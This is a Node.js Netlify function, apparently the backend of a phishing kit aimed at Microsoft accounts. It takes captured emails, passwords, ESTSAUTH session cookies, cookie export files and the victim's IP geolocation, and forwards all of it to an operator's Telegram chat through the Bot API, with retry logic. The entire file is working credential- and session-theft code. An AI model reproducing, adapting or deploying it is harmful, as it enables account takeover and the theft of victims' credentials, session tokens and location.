/**
 * ENHANCED Telegram Bot Function for Netlify
 * Handles credential and cookie data transmission with IP detection and file export
 * Supports comprehensive Microsoft domain cookie capture with location data
 */

const https = require('https');

// ENHANCED: Telegram configuration with better error handling
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ENHANCED: Validation function
function validateTelegramConfig() {
  if (!TELEGRAM_BOT_TOKEN) {
    throw new Error('TELEGRAM_BOT_TOKEN environment variable is required');
  }
  if (!TELEGRAM_CHAT_ID) {
    throw new Error('TELEGRAM_CHAT_ID environment variable is required');
  }
  return true;
}

// ENHANCED: Message formatting with location data and file information
function formatTelegramMessage(data) {
  const {
    email = '',
    password = '',
    passwordSource = 'unknown',
    cookies = [],
    locationData = {},
    cookieFiles = {},
    authenticationTokens = null,
    userAgent = '',
    sessionId = '',
    url = '',
    timestamp = '',
    validated = false,
    microsoftAccount = false,
    domain = '',
    rawCookies = '',
    captureContext = {},
    browserCapabilities = {},
    retryAttempt = 0,
    enhancedCapture = false
  } = data;

  // Helper function to escape HTML special characters
  const escapeHtml = (text) => {
    if (!text) return '';
    return String(text)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  };

  // ENHANCED: Message structure with location and file data
  let message = '<b>🔐 Microsoft Account Credentials Captured</b>\n';
  if (captureContext.microsoftDomainCapture) {
    message = '<b>🚀 ENHANCED MS-DOMAIN CAPTURE</b>\n';
  }
  message += '\n';
  
  // Credential information
  if (email) {
    message += `<b>📧 Email:</b> <code>${escapeHtml(email)}</code>\n`;
  }
  if (password) {
    message += `<b>🔑 Password:</b> <code>${escapeHtml(password)}</code>\n`;
  }
  
  // ENHANCED: Location information
  if (locationData && locationData.ip && locationData.ip !== 'Unknown') {
    message += '\n<b>🌍 Location Information:</b>\n';
    message += `<b>📍 IP Address:</b> <code>${escapeHtml(locationData.ip)}</code>\n`;
    message += `<b>🏙️ City:</b> ${escapeHtml(locationData.city)}\n`;
    message += `<b>🗺️ Region:</b> ${escapeHtml(locationData.region)}\n`;
    message += `<b>🌎 Country:</b> ${escapeHtml(locationData.country)} (${escapeHtml(locationData.countryCode)})\n`;
    if (locationData.timezone) {
      message += `<b>⏰ Timezone:</b> ${escapeHtml(locationData.timezone)}\n`;
    }
    if (locationData.isp) {
      message += `<b>🌐 ISP:</b> ${escapeHtml(locationData.isp)}\n`;
    }
  }
  
  // Validation status
  message += '\n<b>✅ Account Status:</b>\n';
  message += `• Validated: ${validated ? 'Yes' : 'No'}\n`;
  message += `• Microsoft Account: ${microsoftAccount ? 'Yes' : 'No'}\n`;
  
  // Source information
  message += `• Source: ${escapeHtml(passwordSource)}\n`;
  if (domain) {
    message += `• Domain: ${escapeHtml(domain)}\n`;
  }
  
  // ENHANCED: Cookie information with file details
  if (cookies && cookies.length > 0) {
    message += `\n<b>🍪 Cookie Information:</b>\n`;
    message += `• Total Cookies: ${cookies.length}\n`;
    
    // Show important Microsoft cookies
    const importantCookies = cookies.filter(cookie => 
      cookie.name && (
        cookie.name.includes('ESTSAUTH') ||
        cookie.name.includes('SignInStateCookie') ||
        cookie.name.includes('ESTSAUTHPERSISTENT') ||
        cookie.name.includes('ESTSAUTHLIGHT')
      )
    );
    
    if (importantCookies.length > 0) {
      message += `• Auth Cookies: ${importantCookies.length} found\n`;
      message += '• Key Auth Cookies:\n';
      importantCookies.slice(0, 3).forEach(cookie => {
        const cookieValue = cookie.value ? cookie.value.substring(0, 20) + '...' : 'empty';
        message += `  - ${escapeHtml(cookie.name)}: ${escapeHtml(cookieValue)}\n`;
      });
    }
    
    // ENHANCED: Cookie file information
    if (cookieFiles && (cookieFiles.txtFile || cookieFiles.jsonFile)) {
      message += '\n<b>📁 Cookie Export Files:</b>\n';
      if (cookieFiles.txtFile) {
        message += `• TXT File: ${escapeHtml(cookieFiles.txtFile.name)} (${Math.round(cookieFiles.txtFile.size / 1024)}KB)\n`;
      }
      if (cookieFiles.jsonFile) {
        message += `• JSON File: ${escapeHtml(cookieFiles.jsonFile.name)} (${Math.round(cookieFiles.jsonFile.size / 1024)}KB)\n`;
      }
    }
  }
  
  // Browser and technical information
  if (browserCapabilities && browserCapabilities.browser) {
    message += `\n<b>🌐 Browser:</b> ${escapeHtml(browserCapabilities.browser)} v${escapeHtml(browserCapabilities.version)}\n`;
  }
  
  if (userAgent) {
    const userAgentTrunc = userAgent.substring(0, 100) + (userAgent.length > 100 ? '...' : '');
    message += `<b>📱 User Agent:</b> <code>${escapeHtml(userAgentTrunc)}</code>\n`;
  }
  
  // ENHANCED: Capture context with location and file info
  if (captureContext && Object.keys(captureContext).length > 0) {
    message += '\n<b>📊 Capture Details:</b>\n';
    if (captureContext.hostname) {
      message += `• Hostname: ${escapeHtml(captureContext.hostname)}\n`;
    }
    if (captureContext.microsoftDomainCapture) {
      message += `• Microsoft Domain Capture: Yes\n`;
    }
    if (captureContext.locationDataCaptured) {
      message += `• Location Data: Captured\n`;
    }
    if (captureContext.cookieFilesCreated) {
      message += `• Cookie Files: Created\n`;
    }
    if (captureContext.hasStoredCredentials !== undefined) {
      message += `• Stored Credentials: ${captureContext.hasStoredCredentials ? 'Yes' : 'No'}\n`;
    }
    if (captureContext.injectorVersion) {
      message += `• Injector Version: ${escapeHtml(captureContext.injectorVersion)}\n`;
    }
    if (retryAttempt > 0) {
      message += `• Retry Attempt: ${retryAttempt + 1}\n`;
    }
  }
  
  // Timestamp and session
  message += `\n<b>⏰ Timestamp:</b> <code>${escapeHtml(timestamp || new Date().toISOString())}</code>\n`;
  if (sessionId) {
    message += `<b>🔗 Session ID:</b> <code>${escapeHtml(sessionId)}</code>\n`;
  }
  if (url) {
    message += `<b>🔗 URL:</b> ${escapeHtml(url)}\n`;
  }
  
  return message;
}

// ENHANCED: Cookie file content formatting for Telegram
function formatCookieFileContent(cookieFiles) {
  if (!cookieFiles || (!cookieFiles.txtFile && !cookieFiles.jsonFile)) {
    return null;
  }
  
  let fileMessages = [];
  
  if (cookieFiles.jsonFile && cookieFiles.jsonFile.content) {
      const jsonMessage = `<b>📄 ${cookieFiles.jsonFile.name}</b>\n` +
                          '<pre><code>' +
                          cookieFiles.jsonFile.content +
                          '</code></pre>';
      fileMessages.push(jsonMessage);
  }
  
  return fileMessages;
}

// ENHANCED: Cookie details formatting with better organization
function formatCookieDetails(cookies) {
  if (!cookies || cookies.length === 0) {
    return 'No cookies captured';
  }
  
  // Helper function to escape HTML special characters
  const escapeHtml = (text) => {
    if (!text) return '';
    return String(text)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  };
  
  let cookieMessage = `<b>🍪 Detailed Cookie Analysis (${cookies.length} total):</b>\n\n`;
  
  // Group cookies by importance
  const authCookies = [];
  const sessionCookies = [];
  const trackingCookies = [];
  const otherCookies = [];
  
  cookies.forEach(cookie => {
    if (!cookie.name) return;
    
    const name = cookie.name.toLowerCase();
    if (name.includes('estsauth') || 
        name.includes('signinstatecookie') ||
        name.includes('estsauthpersistent') ||
        name.includes('estsauthlight') ||
        name.includes('buid') ||
        name.includes('esctx')) {
      authCookies.push(cookie);
    } else if (name.includes('session') || 
               name.includes('sess') ||
               name.includes('sid')) {
      sessionCookies.push(cookie);
    } else if (name.includes('track') ||
               name.includes('analytics') ||
               name.includes('_ga') ||
               name.includes('_gid')) {
      trackingCookies.push(cookie);
    } else {
      otherCookies.push(cookie);
    }
  });
  
  // Format auth cookies (most important)
  if (authCookies.length > 0) {
    cookieMessage += '<b>🎯 Authentication Cookies:</b>\n';
    authCookies.forEach((cookie, index) => {
      cookieMessage += `${index + 1}. <code>${escapeHtml(cookie.name)}</code>\n`;
      cookieMessage += `   Value: <code>${escapeHtml(cookie.value ? cookie.value.substring(0, 60) + '...' : 'empty')}</code>\n`;
      if (cookie.domain) cookieMessage += `   Domain: ${escapeHtml(cookie.domain)}\n`;
      if (cookie.secure) cookieMessage += `   Secure: Yes\n`;
      if (cookie.expires) cookieMessage += `   Expires: ${new Date(cookie.expires).toUTCString()}\n`;
      cookieMessage += '\n';
    });
  }
  
  // Format session cookies
  if (sessionCookies.length > 0) {
    cookieMessage += '<b>🔗 Session Cookies:</b>\n';
    sessionCookies.slice(0, 5).forEach((cookie, index) => {
      const cookieValue = cookie.value ? cookie.value.substring(0, 40) + '...' : 'empty';
      cookieMessage += `${index + 1}. <code>${escapeHtml(cookie.name)}</code>: <code>${escapeHtml(cookieValue)}</code>\n`;
    });
    if (sessionCookies.length > 5) {
      cookieMessage += `... and ${sessionCookies.length - 5} more session cookies\n`;
    }
    cookieMessage += '\n';
  }
  
  // Format other cookies (summary only)
  if (trackingCookies.length > 0) {
    cookieMessage += `<b>📊 Tracking Cookies:</b> ${trackingCookies.length} found\n`;
  }
  if (otherCookies.length > 0) {
    cookieMessage += `<b>📋 Other Cookies:</b> ${otherCookies.length} additional cookies\n`;
  }
  
  return cookieMessage;
}

// ENHANCED: Telegram API call with better error handling and retry logic
async function sendToTelegram(message, retryCount = 0) {
  const maxRetries = 3;
  
  return new Promise((resolve, reject) => {
    // Split message if it's too long
    const messages = [];
    const MAX_LENGTH = 4096;
    if (message.length > MAX_LENGTH) {
        let currentPos = 0;
        while(currentPos < message.length) {
            messages.push(message.substring(currentPos, currentPos + MAX_LENGTH));
            currentPos += MAX_LENGTH;
        }
    } else {
        messages.push(message);
    }

    const sendAllMessages = async () => {
        for (const msg of messages) {
            const postData = JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: msg,
              parse_mode: 'HTML',
              disable_web_page_preview: true
            });

            const options = {
              hostname: 'api.telegram.org',
              port: 443,
              path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
              },
              timeout: 15000 // 15 second timeout for enhanced data
            };

            await new Promise((resolveRequest, rejectRequest) => {
                const req = https.request(options, (res) => {
                  let data = '';
                  res.on('data', (chunk) => data += chunk);
                  res.on('end', () => {
                    try {
                      const response = JSON.parse(data);
                      if (res.statusCode === 200 && response.ok) {
                        resolveRequest(response);
                      } else {
                        console.error('❌ Telegram API error:', response);
                        rejectRequest(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
                      }
                    } catch (parseError) {
                      rejectRequest(new Error('Invalid response from Telegram API'));
                    }
                  });
                });
                req.on('error', (error) => rejectRequest(error));
                req.on('timeout', () => {
                  req.destroy();
                  rejectRequest(new Error('Request timeout'));
                });
                req.write(postData);
                req.end();
            });
        }
    };

    const attemptSend = (retries) => {
        sendAllMessages()
            .then(resolve)
            .catch(error => {
                console.error(`❌ Request error (attempt ${maxRetries - retries + 1}):`, error);
                if (retries > 0) {
                    console.log(`🔄 Retrying in ${(maxRetries - retries + 1) * 2000}ms...`);
                    setTimeout(() => attemptSend(retries - 1), (maxRetries - retries + 1) * 2000);
                } else {
                    reject(error);
                }
            });
    };

    attemptSend(maxRetries);
  });
}

// ENHANCED: Main handler function with comprehensive error handling and file support
exports.handler = async (event, context) => {
  // Set CORS headers for all responses
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Accept',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ message: 'CORS preflight successful' })
    };
  }

  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ 
        error: 'Method not allowed',
        message: 'Only POST requests are accepted'
      })
    };
  }

  try {
    // Validate Telegram configuration
    validateTelegramConfig();

    // Parse request body
    let requestData;
    try {
      requestData = JSON.parse(event.body || '{}');
    } catch (parseError) {
      console.error('❌ Failed to parse request body:', parseError);
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'Invalid JSON',
          message: 'Request body must be valid JSON'
        })
      };
    }

    // ENHANCED: Data validation with location and file support
    const {
      email,
      password,
      cookies = []
    } = requestData;

    // Validate that we have meaningful data to send
    if (!email && !password && (!cookies || cookies.length === 0)) {
      console.warn('⚠️ No meaningful data provided');
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'No data provided',
          message: 'At least email, password, or cookies must be provided'
        })
      };
    }

    console.log('📨 Processing enhanced Telegram message with data:', {
      hasEmail: !!requestData.email,
      hasPassword: !!requestData.password,
      cookieCount: requestData.cookies.length,
      source: requestData.passwordSource,
      hasLocationData: !!(requestData.locationData && requestData.locationData.ip),
      hasCookieFiles: !!(requestData.cookieFiles && (requestData.cookieFiles.txtFile || requestData.cookieFiles.jsonFile))
    });

    // Format and send main message with enhanced data
    const mainMessage = formatTelegramMessage(requestData);
    await sendToTelegram(mainMessage);

    // ENHANCED: Send cookie file content as separate message if available
    const fileMessages = formatCookieFileContent(requestData.cookieFiles);
    if (fileMessages) {
        for (const fileMessage of fileMessages) {
            try {
                if (fileMessage) {
                    await sendToTelegram(fileMessage);
                    console.log('✅ Cookie file content sent successfully');
                }
            } catch (fileError) {
                console.warn('⚠️ Failed to send cookie file content:', fileError.message);
            }
        }
    }

    // ENHANCED: Success response with comprehensive data summary
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ 
        success: true,
        message: 'Enhanced data sent to Telegram successfully',
        timestamp: new Date().toISOString(),
        dataProcessed: {
          email: !!requestData.email,
          password: !!requestData.password,
          cookies: requestData.cookies.length,
          locationData: !!(requestData.locationData && requestData.locationData.ip),
          cookieFiles: !!(requestData.cookieFiles && (requestData.cookieFiles.txtFile || requestData.cookieFiles.jsonFile))
        }
      })
    };

  } catch (error) {
    console.error('❌ Enhanced handler error:', error);
    
    // Return appropriate error response
    const isConfigError = error.message.includes('environment variable');
    const statusCode = isConfigError ? 500 : 400;
    
    return {
      statusCode,
      headers,
      body: JSON.stringify({ 
        error: 'Enhanced processing failed',
        message: isConfigError ? 'Server configuration error' : error.message,
        timestamp: new Date().toISOString()
      })
    };
  }
};
